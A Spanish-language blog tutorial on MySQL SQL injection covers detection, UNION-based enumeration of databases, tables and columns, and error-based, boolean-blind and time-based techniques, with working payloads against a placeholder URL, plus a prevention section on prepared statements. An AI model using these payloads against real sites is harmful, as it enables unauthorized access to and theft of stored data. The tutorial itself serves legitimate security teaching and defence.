---
layout: post
title: "Inyecciones SQL"
date: 2022-01-31 16:30 -0200
fecha: 25/03/2022
hora: '16:30'
categories: blog
---

Las inyecciones SQL se dan exclusivamente en las bases de datos y, por lo general, desde las aplicaciones web.

Pueden darse en cualquier Database Management System (DBMS).<br>
Este artículo demostrará ejemplos del DBMS MySQL.

<!--more-->

<br>

---

<br>

<div id="toc_container">
<p class="toc_title">Tabla de Contenidos</p>
<ul class="toc_list">
  <li><a href="#Basics">Basics</a></li>
  <li><a href="#Procedimiento">Procedimiento</a></li>
  <li><a href="#Distintas Formas">Distintas formas y técnicas de ejecución</a></li>
  <li><a href="#Prevención">Prevención</a></li>
  <li><a href="#Ejemplos Prácticos">Ejemplos Prácticos</a></li>
  <ul>
   <li><a href="#Basada en Union">Basada en Union</a></li>
   <li><a href="#Basada en Error">Basada en Error</a></li>
   <li><a href="#Basada en Booleanos">Basada en Booleanos</a></li>
   <li><a href="#Basada en Tiempo">Basada en Tiempo</a></li>
  </ul>
</ul>
</div>
<br>

---
<h2>Antes de empezar </h2>
Voy a tratar de explicar todo de forma que cualquier persona, con mínimos conocimientos del tema, pueda entenderlo.

¿Por qué? Porque de esta forma puedo asegurar tanto el entendimiento de quien sea que esté interesado en este tópico, como el mío.

Mi recomendación para aprender bien este ataque es ir probando las distintas técnicas y comandos en una consola de MySQL.

<h2 id="Basics">Cosas Básicas</h2>
Un par de preguntas y respuestas rápidas para "entrar en contacto" con la vulnerabilidad.

<br>

<h3 id="Qué">¿Qué es?</h3>

---

La vulnerabilidad Inyección SQL es una de tipo, como su nombre lo dice, de inyección de código.

<br>

<h3 id="Cómo">¿Cómo se ejecuta?</h3>

---

Se lleva a cabo ingresando código de la base de datos en algun input con el objetivo de manipular el funcionamiento del backend.

<br>

<h3 id="Dónde">¿Dónde se da?</h3>

---

Se da, por lo general, en las aplicaciones web.
Específicamente, se da en aquellas funciones de la aplicación que acepten el input del usuario.

<br>

<h3 id="¿¿Por Qué??">¿Por qué surge?</h3>

---

Surge debido a una mala (o nula) sanitización del código del archivo que recibe el valor del input del usuario y que, al mismo tiempo, envía 
una consulta a la base de datos, lo que permite que este usuario pueda manipular dicha consulta, haciéndolo capaz de visualizar, modificar o 
eliminar cualquier valor. Ej: Ver bases de datos, tablas, usuarios, contraseñas, tarjetas de crédito y un largo, largo etcétera.
Incluso podría ejecutar comandos del sistema o visualizar archivos del mismo, si las condiciones les son favorables.

---

<br>
<h3 id="Procedimiento">Procedimiento</h3>

---

El procedimiento suele ser el siguiente:
1. Analizar en dónde se están realizando las consultas a la base de datos.
2. Detectar la vulnerabilidad.
3. Averiguar la cantidad de columnas de la tabla.
4. Visualizar las bases de datos.
5. Visualizar las tablas.
6. Visualizar las columnas.
7. Extraer la información.

---

Ejemplos que usaré de aquí en adelante.

Base de datos: "epic_database"

Tabla: "galeria"

URL:
<pre><a class="ej">http://pagina.com/galeria.php?id=1</a></pre>

Supongamos que la página está haciendo la siguiente consulta a la base de datos:
```
 SELECT * FROM galeria WHERE id = 1;
```
<br>

---

<br>
<h4>1. Analizar en dónde se están realizando las consultas a la base de datos </h4>

Se trata de ver en qué parte de la página web se podrían estar realizando dichas consultas.

**Ejemplos:**
* Paneles de logueo
* Paneles de registro
* Paneles de búsquedas.

**Darle un vistazo a8 la URL siempre es algo informativo.**

<br>

---

<br>
<h4>2. Detectar la vulnerablidad </h4>

Para detectarla se suele tratar de romper la sintaxis, modificando la query.
Se lo suele hacer a través de comillas, operaciones lógicas/aritméticas y/o comentarios.

<br>

<h5>Comillas</h5>
No importa si la query está solicitando una cadena o un entero. Las comillas suelen rompen la sintaxis, en caso de que el código no esté sanitizado.

* Generar un error de sintaxis.
* Escapar del contexto.<br>
Si una consulta espera que el valor del input del usuario sea una cadena, que esté entre comillas, se las utiliza para cerrarlas y lograr que 
el código inyectado se interprete como un comando.

**Ejemplos**

* Comillas simples: '

* Comillas dobles: "

* Backticks: `

**Payload:**

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(comillas)</font></a>

<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">'</font></a>
</pre>

**Consulta:**

```
SELECT * FROM galeria WHERE id = 1';
```

Devuelve un error como el siguiente:

<kbd class="highlight">
ERROR: Could not able to execute SELECT * FROM galeria WHERE id = 1<font class="bordo">'</font>;. You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '<font class="bordo">'</font>' at line x 
</kbd>

Lo que sucede es que la base de datos espera una petición cuyo valor sea un entero (en este caso 1) y, al recibir algo distinto (1'), se 
produce un error y no puede continuar con la operación debido al uso de una sintaxis inválida.

¿Qué es lo que se espera?<br>
Un error que puede estar en forma de:
* Error directo de la base de datos.
* Comportamiento inusual de la página en cuestión.

<br>
<h5>Comentarios</h5>

Por lo general, los comentarios son utilizados luego de las comillas o las operaciones lógicas.

El objetivo de inyectar comentarios es anular los comandos que le sigan a la consulta manipulada.

**Ejemplos:**

* <p> -- comentario (nótese el espacio en blanco luego de los guiones, es importante) </p>

* <p>#comentario</p>

* <p>/*comentario*/</p>

**Payload:**

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(operaciones)(comentario)</font></a>
</pre>
<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1;#</font></a>
</pre>
<br>

<h5>Operaciones Lógicas</h5>
Lo que se busca con las operaciones lógicas es ver comprobar su ejecución.

* Son utilizadas para mostrar información oculta o hacer un bypass a un panel de logueo.
* Muy usadas en inyecciones a ciegas.

**Ejemplo:**

* OR 1=1
* AND 1=1

**Payload:**

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">(operación)</font></a>
</pre>
<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1</font></a>
</pre>

**Consulta:**

Hagamos de cuenta que la web hace una consulta a la base de datos estrictamente sobre obras de arte que ya salieron a la vista del público, ocultando aquellas que todavía estén en producción.
Lo cual se vería así:
```
SELECT * FROM galeria WHERE id = 1 AND status = "publica";
```

Si un usuario manipulara la consulta a la base de datos podría ver aquellas obras que aún no están a la vista del público ya que no se 
ejecutaría la parte del código que lo impide.

En tal caso, el payload:
<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">OR 1=1;#</font></a>
</pre>

Enviaría la siguiente consulta:

<pre class="highlight">
SELECT * FROM galeria WHERE id = 1 <font class="bordo">OR 1=1;#</font> <font class="gris">AND status = "publica";</font>
</pre>

Lo que mostraría tanto las obras públicas como las que aún están en producción debido a que, al estar comentada, no se valida la parte de la 
consulta que se encarga de que eso no suceda.

¿Por qué?

Porque se están consultando aquellas obras de arte cuya id sea 1 **o** 1=1, lo cual es una sentencia que devuelve **True**. Por ende, la base 
de datos devuelve las obras cuya id sea 1 o **True**. Esto significa que devolverá cualquier obra que tenga asignado algún valor en la columna 
'id'. Incluso aquellas que tengan "NULL" debido a que también es un valor.

<br>
<!--<h5>Procedimiento</h5>-->
<!---->
<!--Una especie de metodología (?) que me armé cuando estaba practicando esta vulnerabilidad.-->
<!---->
<!--1. Testear lógica.-->
<!---->
<!--2. Intentar romper sintaxis.-->
<!---->
<!--3. Probar con cada forma de hacer comentarios.-->

***El tema es que si algo cambia, si algo se rompe o incluso cuando no, es muy probable que exista la vulnerabilidad.***

<br>

---

<br>
<h4>3. Averiguar la cantidad de columnas de la tabla </h4>
Se busca saber exactamente cuántas columnas hay en la tabla que se está consultando.

Esto se logra a través de cláusulas de MySQL que se deben inyectar.

Estas cláusulas son: ORDER BY y UNION SELECT.

<br>
<h5>ORDER BY </h5>
Permite saber el límite de columnas que hay en la tabla.
No genera ningún output al ejecutar el comando exitosamente (ordenar columnas existentes), el output se genera en forma
de error cuando se intenta "ordenar" columnas cuyo límite ya fue alcanzado.

* Básicamente, se produce un error si se intenta "ordenar" a las columnas por una cantidad mayor de las que existen. Ese error es lo que
permite saber el límite de columnas.

* Se debe ir probando hasta alcanzar el límite de columnas.

**Ejemplo:**

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">ORDER BY 4;#</font></a>
</pre>

Anotación:

**Es importante saber el número exacto de columnas ya que de otra forma no se podrá continuar.**

<br>
<h5>UNION SELECT </h5>
Permite listar las columnas de fórma simbólica. Es decir, cada columna toma el valor de un número (o lo que se quiera poner en su lugar).
Esto sirve para poder listar otro tipo de información como el nombre de las bases de datos, de las tablas y demás. Yo lo veo como si fueran 
recipientes.

* Se lista el número máximo de columnas.
* Sin estas cláusulas no se puede seguir con el procedimiento. Es fundamental.

**Ejemplo:**

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">UNION SELECT 1,2,3,4;#</font></a>
</pre>

Anotación:
**Se debe listar por la cantidad máxima de columnas, ni más ni menos. De otra forma dará error.**

<br>

---

<br>
<h4>4. Visualizar las bases de datos </h4>
A partir de acá se utilizan los llamados "metadatos" para listar información que de otra manera no sería visible.

Estos metadatos contienen la información de prácticamente todo; bases de datos, tablas, columnas, etc.

* Solo proveen acceso de lectura, lo cual significa que no se puede ejecutar ningún comando como INSERT, UPDATE o DELETE.

* Son estándares que siempre existen dentro de una base de datos.

* Los metadatos se guardan en una base de datos particular llamada "INFORMATION_SCHEMA".

* Se utiliza una forma alternativa de seleccionar los datos de una tabla (o al menos para mí lo es).
> <font class="highlight" size="2">SELECT (columna) FROM (database).(tabla)</font><br><font size="2">Te permite seleccionar el valor de la columna de una tabla de una base de datos, sin importar si estás o no utilizando esa base de datos. </font>

Objetos utilizados:

* INFORMATION_SCHEMA (database)
><font size="2">Base de datos que contiene los metadatos. </font>

* SCHEMATA (tabla)
><font size="2">Tabla perteneciente a la base de datos "INFORMATION_SCHEMA" que contiene información de todas las bases de datos. </font>

* SCHEMA_NAME (columna)
><font size="2">Columna perteneciente a la tabla "SCHEMATA" que guarda el nombre de todas las bases de datos. </font>

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">UNION SELECT 1,SCHEMA_NAME,3 FROM INFORMATION_SCHEMA.SCHEMATA;#</font></a>
</pre>

_"Seleccionar los datos de la columna 'SCHEMA_NAME' de la tabla 'SCHEMATA' cuya base de datos es 'INFORMATION_SCHEMA'"_

**Es lo mismo que ejecutar lo siguiente en la consola de MySQL:**

``` 
show databases; 
```
<br>

---

<br>
<h4>5. Visualizar las tablas </h4>
Mismo procedimiento pero cambian la tabla y columnas de information_schema.

Objetos utilizados:

* INFORMATION_SCHEMA (database)

* TABLES (tabla)
> <font size="2"> Tabla que contiene información de todas las tablas de todas las bases de datos.</font>

* TABLE_NAME (columna)
> <font size="2"> Columna que guarda el nombre de todas las tablas de todas las bases de datos. </font>

* TABLE_SCHEMA (columna)
> <font size="2"> Columna que contiene el nombre de la base de datos a la que pertenece x tabla. </font>

**Ejemplo:**
<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">UNION SELECT 1,2,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = "epic_database";#</font></a>
</pre>

_"Quiero saber el contenido de la columna 'TABLE_NAME' de la base de datos 'INFORMATION_SCHEMA' cuya tabla es 'TABLE_SCHEMA', donde el valor de la 
columna 'TABLE_SCHEMA' sea 'epic_database'"_

**Es el equivalente a ejecutar lo siguiente en la consola de MySQL:**
```
use {base_de_datos};

show TABLES;
```

***Es preciso especificar el "TABLE_SCHEMA" debido a que de otra forma se mostrarán todos los valores de la columna "TABLE_NAME", lo cual sería un desastre.***

<br>

---

<br>
<h4>6. Visualizar las columnas </h4>
Mismo procedimiento pero cambian la tabla y la columna.

Objetos utilizados:

* INFORMATION_SCHEMA (database)

* COLUMNS (tabla)
> <font size="2"> Tabla que guarda información de todas las columnas de todas las tablas de todas las bases de datos.</font>

* COLUMN_NAME (columna)
> <font size="2"> Columna que guarda el nombre de todas las columnas de todas las... Ya saben el resto. </font>

* TABLE_NAME (columna)
> <font size="2"> Columna que guarda el nombre de la tabla a la que pertenece x columna. </font>

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">UNION SELECT 1,2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = "galeria";#</font></a>
</pre>

_"Quiero saber los datos de la columna 'COLUMN_NAME', de la tabla 'COLUMNS', cuya base de datos es 'INFORMATION_SCHEMA' y la columna 'TABLE_NAME' tiene el valor de 'galeria'"_

**Es algo parecido a ejecutar:**
```
describe galeria;
```

_Recordar que el 'where' siempre funciona como "guía" para evitar mostrar información innecesaria._

<br>

---

<br>
<h4>7. Extraer la información</h4>
En esta parte ya se muestra la información, pero se sigue utilizando la forma relativa de hacerlo.

Objetos utilizados:
* A esta altura ya se sabe todo lo necesario para extraer la información, por lo que no se hace uso de information_schema.

Funciones utilizadas:
* concat()
> <font size="2">Sirve para mostrar el valor de varias columnas en una sola sentencia.</font>

<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">UNION SELECT 1,2,concat(id,':',nombre,':',propietario) FROM epic_database.galeria;#</font></a>
</pre>

_"Mostrar, de forma concatenada, el valor de la columna 'id', 'nombre' y 'propietario' de la tabla 'galeria' cuya base de datos es 'epic_database'"_

Lo mejor es hacerlo de la forma alternativa de seleccionar la información (como se acaba de mostrar).

**Es parecido a ejecutar lo siguiente en la consola de MySQL:**
```
SELECT concat(id,':', nombre,':', propietario) FROM epic_database.galeria;
```
<br>

<h3 id="Distintas Formas">Distintas formas de ejecutarla</h3>

---

Por lo general, las inyecciones SQL se ejecutan siempre de la misma forma al comienzo. Lo unico que cambia es como se muestra la información en pantalla.

<font syle="color:blue">¿A qué me refiero con esto? </font>

No existe una sola forma de detectar y explotar esta vulnerabilidad ya que hay escenarios en los que no es posible visualizar la información deseada o incluso algunos en los que no se ve ninguna información.

Antes de profundizar en las distintas formas de ejecutar esta vulnerabilidad, quisiera nombrar los tipos de Inyección SQL que existen, los cuales son:

* Inyección SQL en Banda (In Band)
	* Inyección SQL Basada en Union (Union Based)
	* Inyección SQL Basada en Error (Error Based)
* Inyección SQL Inferencial (Inferential)
	* Inyección SQL a Ciegas (Blind)
	* Inyección SQL Basada en Tiempo (Time Based) 
* Inyección SQL Fuera de Banda (Out of Band)

<br>

---

<h4 id="En Banda">Inyección SQL en Banda (In Band)</h4>
Las "Inyecciones SQL en banda" o "clásicas" son las más sencillas y, al mismo tiempo, poco probables de ejecutar.<br>
Se caracterizan por el hecho de que se utiliza el mismo "canal de comunicación" para desplegar el ataque y observar los resultados. Un canal de comunicación sería una página web, por ejemplo.

Coloquialmente, se ve la información en el mismo lugar de la ejecución del ataque.

Básicamente:
* Se utiliza el mismo canal para ejecutar el ataque y extraer la información.
* La información es **visible**.

<br>

<h4 id="Union">Inyección SQL Basada en Union (Union Based)</h4>
Es la técnica que se estuvo mostrando a lo largo de toda esta publicación.

<a href="#Basada en Union">Ejemplo práctico de la técnica</a>

<br>

<h4 id="Error">Inyección SQL Basada en Error (Error Based)</h4>
Se da cuando en el output no se muestran más que ***errores***.

En teoría, lo que hace esta técnica es, a partir de un error, mostrar información de la base de datos.

En base a un error generado adrede, se lo concatena a x información de la base de datos.

* Existen distintas formas de ejecutar este tipo de ataque, no obstante, todas se basan en el mismo principio; listar información a partir de errores.

* Utiliza las funciones:
	* limit
	* ExtractValue()

<br>
<h5>ExtractValue</h5>
Es una función utilizada para visualizar información de XML en MySQL.

**Uso:**
ExtractValue(xml_frag, xml_path)

xml_frag = Se especifica el valor que se quiere extraer y dentro de qué tags está.

xlm_path = Es la ruta hacia el valor a extraer. Se la especifica como si fuera la ruta a un archivo en Linux.

Ejemplo:
```
SELECT ExtractValue('<tag1><tag2>Valor a extraer</tag2></tag1>', '/tag1/tag2');
```
Lo que interesa de esta función es su output al haber un error de sintaxis en el argumento _xml_path_, el cual muestra el valor específico que
está causando dicho error.

Ejemplo:
Si yo decidiera, por alguna razón, poner una backtick en el argumento _xml_path_:
```
SELECT ExtractValue('<tag1><tag2>Valor a extraer</tag2></tag1>', '`');
```
Se generaría un error de sintaxis, que se vería algo así:
```
ERROR 1105 (HY000): XPATH syntax error: '`'
```
Por ende, si se pudiera concatenar esa backtick a un valor de la base de datos, sería posible visualizarlo.
Para lograr esto, se hace uso de lo que se conoce como _subquery_.

Las subqueries, básicamente, son cláusulas dentro de otras cláusulas.<br>
Para más info, seguir <a href="https://dev.mysql.com/doc/refman/8.0/en/subqueries.html" target="_blank">este link</a>.

Ejemplo: un SELECT dentro de otro SELECT
```
SELECT (SELECT @@version);
```
El tema ahora es que, al ser una subquery, no puede devolver más de un valor. Es decir, solo puede mostrar una fila o, caso contrario,
la información no será visible. Reglas de SQL.

En consecuencia, se hace uso de la cláusula _LIMIT_ para visualizar una fila a la vez.

<br>
<h5>LIMIT</h5>
Sirve para limitar el número de filas que se muestran. Se usa en conjunto con la cláusula 'SELECT'.

**Uso:**

Puede aceptar uno o dos argumentos.

<kbd>LIMIT {indice}, {cantidad}

indice = En qué indice se encuentra la fila a mostrar. 0 es el primero.

cantidad = Número de filas a mostrar.

Ejemplo:
```
SELECT * FROM galeria LIMIT 0,1;
```
_"Quiero ver toda la información dentro de la tabla 'galeria' pero limitando el output, desde la primer fila, a una sola fila"_

Retomando, si se quisiera concatenar alguna información de la base de datos al error de sintaxis, se utilizaría una consulta como la siguiente:
<pre class="highlight">
SELECT ExtractValue('LOL', concat('`', (SELECT schema_name FROM information_schema.schemata LIMIT 1,1)));#
</pre>

Cabe destacar que el valor de _xml_frag_ pueden ser enteros o cadenas y aún así la query funcionará.

En el contexto de una inyección, el payload sería el siguiente:
<pre>
<a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">AND ExtractValue('LOL', concat('`', (SELECT schema_name FROM information_schema.schemata LIMIT 1,1)));#</font></a>
</pre>

Notas:
* La primer base de datos suele ser 'information_schema' en sí, por lo que no tiene mucho sentido apuntar a ella con LIMIT.
* Muchas veces es necesario hacer uso de caracteres en hexadecimal en el argumento _xml_path_, específicamente en la concatenación. Es decir, en vez de usar '`', se usa su forma hexadecimal; 0x60. Esto se hace cuando las comillas están sanitizadas.
* ExtractValue() tiene un límite de 20 bytes que puede extraer, por lo que, si se quiere ver algo más grande que eso, se tiene que utilizar el método de la cláusula "SELECT".
* Es recomendable utilizar el Intruder de la herramienta Burpsuite.

<a href="https://www.rafaybaloch.com/2017/06/error-based-sql-injection-tricks-in.html">Este</a> y <a href="https://websec.ca/kb/sql_injection">este otro</a> artículo me ayudaron bastante a entender esta variación. Recomiendo su lectura ya que allí se muestran otras formas de ejecutar este tipo de ataque, incluyendo el método de la cláusula "SELECT".

<a href="#Basada en Error">Ejemplo práctico de la técnica</a>

<br>

---

<h4 id="Inferencial">Inyección SQL Inferencial (Inferential)</h4>
Se caracteriza por el hecho de que no hay forma de ver el resultado del ataque.

En este tipo de inyección, se recurre a los *condicionales* y al *tiempo de respuesta* para saber si las consultas son exitosas o no.

* La información ***no es visible*** y se la "extrae" caracter por caracter. Resulta un proceso bastante tardío.

<br>

<h4 id="Boolean">Inyección SQL Basada en Booleanos (Boolean Based)</h4>

Se basa en booleanos (true o false) para determinar la información.

* Los errores suelen ser cualquier cosa menos aquellos provenientes de la base de datos.
	* Ej: Partes de la página que no se muestran, páginas en blanco, etc. Cualquier comportamiento inusual, básicamente.

* Recordar:
	* Si la página carga bien = Consulta exitosa.
	* Si se produce algo inusual = Consulta no exitosa.

* Se suele utilizar la función substring().

* Se hace uso de los condicionales y el operador AND.

<br>
<h5>Función substring()</h5>
Permite extraer caracteres de una string (palabra).

**Uso:**

<kbd>substring({target}, {inicio}, {caracteres})</kbd>

target = Objetivo de la función.

inicio = Desde dónde se comienza la extracción de caracteres. 1 es el primer caracter.

caracteres = Cantidad de caracteres a extraer.

**Ejemplo:**

```
SELECT substring(database(),1,1)
```
_"Del nombre de la base de datos actual, extraer, a partir del primer caracter, un caracter."_

<br>
<h5>Ejemplo práctico</h5>

Base de datos: epic_database

<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)>'a';#</font></a></pre>
"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'a'?"
Verdadero
<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)>'d';#</font></a></pre>
"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'd'?"
Verdadero
<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)>'f';#</font></a></pre>
"¿Es el primer caracter, del nombre de la base de datos actual, mayor a la letra 'f'?"
Verdadero
<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)<'g';#</font></a></pre>
"¿Es el primer caracter, del nombre de la base de datos actual, menor a la letra 'g'?"
Falso
<pre><a class="ej">http://pagina.com/galeria.php?id=5 <font class="bordo">AND substring(database(),1,1)='e';#</font></a></pre>
"¿Es el primer caracter, del nombre de la base de datos actual, igual a la letra 'e'?"
Verdadero

Recordemos el funcionamiento del operador AND:

"Si esto **Y** esto otro es verdadero, **ENTONCES** va a pasar algo".

Contrario al operador OR:

"Si esto **O** esto otro es verdadero, **ENTONCES** va a pasar algo."

**Notas:**
* El intruder de Burp Suite es algo que se tiene que usar sí o sí en esta técnica. La extensión Turbo Intruder también es una buena idea. Eso o usar sqlmap.

<a href="#Basada en Booleanos">Ejemplo práctico de la técnica</a>

<br>

---

<h4 id="Tiempo">Inyección SQL Basada en Tiempo (Time Based)</h4>

En este tipo de inyección, se trata de averiguar valores de la base de datos mediante el tiempo de respuesta de la misma.

* Se hace uso de la función sleep() y el condicional if().
* Tiempo de respuesta tardío = Consulta exitosa.
* Tiempo de respuesta normal = Consulta no exitosa.

<br>
<h5>Función sleep()</h5>
Al ejecutarla, la base de datos "espera" una cantidad de tiempo específica.

**Uso:**
<kbd>sleep({tiempo})</kbd>

tiempo = Cantidad de tiempo de espera.

**Ejemplo:**
<pre class="highlight">SELECT sleep(5);</pre>

<br>
<h5>Condicional if()</h5>
En base a una condición, devuelve true o false. Se deben especificar las acciones que se llevararán a cabo en caso de true y de false.

**Uso:**
<kbd>if({condición},{true},{false})</kbd>

condición = La operación lógica que resulta en true o false.

true = Output o acción a ejecutar en caso de que la condición sea verdadera.

false = Output o acción a ejecutar en caso de que la condición sea falsa.

Por defecto, esta función devuelve información en pantalla. No obstante, acepta subqueries y funciones dentro de ella.

**Ejemplo:**
<pre class="highlight">SELECT if(1=1,'verdadero','falso');</pre>
_"Si 1 es igual a 1 (true), mostrar 'verdadero' en pantalla. Caso contrario (false), mostrar 'falso' en pantalla."_

<pre class="highlight">SELECT if(2>1,sleep(3),sleep(2));</pre>
_"Si 2 es mayor a 1 (true), ejecutar un sleep de 3 segundos. Caso contrario (false), hacer un sleep de 2 segundos."_

**Ejemplo**<br>
Determinar el nombre de la base de datos.

<pre><a class="ej">http://pagina.com/galeria.php?id=1 <font class="bordo">AND IF((substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1) > 'a', sleep(8), NULL);#</font></a></pre>
_"En caso de que el primer caracter de la primera fila de la columna 'schema_name', de la tabla 'schemata', de la base de datos 'information_schema' sea mayor a 'a', entonces hacer un sleep de 10 segundos, caso contrario no hacer nada."_
<br>

El resto es técnicamente lo mismo, solo que van cambiando las columnas y tablas que se utilizan.

**Notas:**
* No utilizar el intruder de burpsuite en esta técnica debería ser considerado delito federal.
* Es recomendable utilizar un sleep de 10 segundos o más, para asegurarse de que el resultado es acertado.

<a href="#Basada en Tiempo">Ejemplo práctico de la técnica</a>

<br>

---

<h4>Inyección SLQ Fuera de Banda (Out of Band)</h4>
Podría ser considerada una combinación entre inyección en banda e inferencial, aunque al mismo tiempo no es ninguna de ellas.

La información es visible, no en el mismo canal del ataque, en otro canal de comunicación.

Básicamente, se envía información, desde la base de datos, a un tercero (el cual tiene la capacidad de recibirla). Este tercero puede ser un
proxy o un servidor en escucha.
* La herramienta Burp Collaborator de Burp Suite es ampliamente utilizada en este tipo de ataques. Está presente en la versión
**PRO** de Burp.
* Utilizar un Virtual Private Server (VPS) es una alternativa.

La información puede ser enviada por medio de distintos protocolos. Los más comunes son:
* Hyper Text Transfer Protocol (HTTP)
* Domain Name System (DNS)

Si bien es posible ejecutarla, este tipo de inyección es muy situacional, todo depende de si la funcionalidad de realizar peticiones HTTP, DNS 
o de otros protocolos está activa o no.

No tuve la oportunidad de ejecutar esta técnica (por obvias razones), por lo que voy a dejar links de artículos que sí dan ejemplos prácticos.

* <a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" target="_blank">Laboratorio de PortSwigger</a>

* <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet#dns-lookup" target="_blank">Cheatsheet (portswigger)</a>


* <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#OutOfBandChannelAttacks" target="_blank">Artículo de Netsparker</a>

* <a href="https://zenodo.org/record/3556347#.Yg1aQvfQ_H6" target="_blank">Artículo muy explicativo de Zenodo</a>

<!--Por último quería dejar este artículo que, si bien no trata de este ataque, explica bastante bien los ataques fuera de banda en sí y cómo-->
<!--se llevan a cabo:-->

* <a href="https://notsosecure.com/out-band-exploitation-oob-cheatsheet" target="_blank">Explicación de ataques OOB (Out Of band) y cheatsheet (notsosecure)</a>

<br>

---

<br>

<h3 id="Prevención">Cómo prevenirla</h3>
La mejor forma de prevenir inyecciones SQL es separando los datos (input) de SQL (comandos) para que, de esta forma, un dato jamás se interprete
como un comando.<br>
Esto se logra mediante distintos métodos:

<!--Prevención: Formas de prevenir inyecciones SQL-->
<!---->
<!--Código vulnerable + solucion + prevención-->
<!---->
<!--Código vulnerable: Panel de búsqueda de obras de arte-->
<!---->
<!--Solución: Código vulnerable sanitizado-->
<!--.-->

* Consultas Preparadas (Prepared Statements)<br>
Es la máxima seguridad contra inyecciones SQL.
Básicamente son consultas que son preparadas con antelación para luego insertar los datos.
Utiliza varios pasos:
1. Crear plantilla (query) y prepararla.<br>
El signo de pregunta indica en dónde irán los datos.<br>
<kbd>$sql = "SELECT * FROM articulos WHERE id = ?";<br>
$stmt = $db->prepare($sql);</kbd>
2. Bindear.<br>
Se proporciona el valor de los parámetros necesarios para enviar la query. <br>
Se enlaza el input a la consulta y se especifica el tipo de dato.<br>
i: integer (entero)<br>
s: string (cadena)<br>
d: double<br>
b: blob<br>
<kbd>$id = $_GET['id'];<br>
$stmt->bind_param("i", $id);</kbd>
3. Ejecutar.<br>
Se envía la consulta.<br>
<kbd>$stmt->execute();</kbd>

<br>
* Procedimientos Almacenados (Stored Procedures)<br>
Es técnicamente lo mismo que las consultas preparadas, con la diferencia de que se guardan en la base de datos en lugar de estar dentro del 
controlador (lenguaje de programación).<br>
Se debe decidir si usar estos o consultas preparadas. Tienen sus pros y contras pero, al final, ambos sirven al mismo fin. 
(dejo un <a href="https://stackoverflow.com/questions/7296417/difference-between-stored-procedures-and-prepared-statements" target="_blank">link</a> sobre el tema).<br>
Requiere un conocimiento del lenguaje utilizado en el DBMS. Ej: MySQL, PostgreSQL, MSSQL, etc.

<br>
* Sanitizar el input.<br>
Jamás confiar en el input del usuario, escaparlo.<br>
Se lo puede combinar con las consultas preparadas o los procedimientos almacenados aunque, por lo general, estos últimos son suficientes para 
prevenir el ataque.<br>
Siguiendo con PHP, la siguiente función realiza un sanitizado del input:<br>
<kbd>mysql_real_escape_string({conn_var},{input})<br>
conn_var = Variable que guarda la conexión a la base de datos.<br>
input = Variable que guarda el input del usuario.<br></kbd>
Previene que el input sea tomado como un comando de la base de datos.

<br>
* Utilizar el principio del menor privilegio.<br>
No dar más privilegios del que un usuario necesita para realizar x acción. Esto aplica tanto para usuarios de la base de datos como para los 
del sistema.

<br>
* Usar listas blancas (whitelist).<br>
Son preferibles a las listas negras.

<br>
* Usar un Web Application Firewall (WAF).<br>
Si bien existen formas de hacer que el Firewall no detecte un determinado payload, nunca está demás tener uno.

<br>
<h4>Código vulnerable</h4>
El siguiente código PHP es vulnerable a inyecciones SQL:

![vulnerabe](/assets/img/screens/vulnerable.png)

No ejecuta ningún tipo de sanitización de por medio, por lo que, inevitablemente, es vulnerable.

Corresponde al siguiente panel de búsqueda:

![panel](/assets/img/screens/panel.png)

Este panel busca obras de arte en la base de datos según su ID. Aquellas obras que tengan un estado de "publica" serán mostradas y aquellas cuyo 
estado sea "privada", no lo harán.

<br>
Consultando una obra obra de arte pública:

![consulta publica](/assets/img/screens/consulta_publica_1.png)

<br>
Consultando una obra de arte privada:

![consulta privada](/assets/img/screens/consulta_privada_1.png)

<br>
Realizando una inyección SQL:

![inyección](/assets/img/screens/inyeccion_1.png)

Como se pudo ver en la imágen anterior, a través de una inyección SQL, se devolvieron todas las obras tanto públicas como privadas.

Eso es sólo un pequeño ejemplo, también se podrían hacer más cosas como visualizar el nombre de las bases de datos, las tablas, columnas, etc.

<br>
<h4>Código seguro</h4>
Este es el mismo código del panel de búsqueda pero, esta vez, haciendo uso de consultas preparadas:

![seguro](/assets/img/screens/seguro.png)

<br>
Consultando una obra de arte pública:

![consulta_publica](/assets/img/screens/consulta_publica_2.png)

<br>
Consultando una obra de arte privada:

![consulta_privada](/assets/img/screens/consulta_privada_2.png)

<br>
Intentando una inyección SQL:

![inyeccion](/assets/img/screens/inyeccion_2.png)

No hubo éxito. El código es invulnerable a este ataque.

<br>

---

<h3 id="Ejemplos Prácticos">Ejemplos prácticos</h3>

Para esta parte del artículo, voy a estar utilizando como sitio de práctica a la <a href="http://testphp.vulnweb.com" target="_blank">galería de Acunetix</a>, la cual está diseñada para ser vulnerable.

